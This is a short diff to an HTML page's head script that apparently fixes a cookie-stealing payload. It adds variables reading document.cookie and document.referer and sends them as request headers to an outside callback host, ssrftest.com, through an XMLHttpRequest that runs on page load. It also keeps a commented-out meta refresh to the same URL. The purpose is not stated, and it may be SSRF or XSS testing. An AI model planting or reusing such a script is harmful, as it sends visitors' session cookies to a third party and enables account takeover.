@@ -3,10 +3,12 @@
   <head>
     <!--<meta http-equiv="refresh" content="0; URL=http://ssrftest.com/x/hCZ8o" />-->
 <script>
+var reqck = document.cookie;
+var reqref = document.referer;
 var xhr= new XMLHttpRequest();
     xhr.open('GET', 'https://ssrftest.com/x/hCZ8o');
-    xhr.setRequestHeader('CustomHeader1',(javascript:document.referer))
-    xhr.setRequestHeader('CustomHeader2',(javascript:document.cookie))
+    xhr.setRequestHeader('CustomHeader1',reqck)
+    xhr.setRequestHeader('CustomHeader2',reqref)
     xhr.send();
     xhr.onreadystatechange= function() {
         if (this.readyState!==4) return;
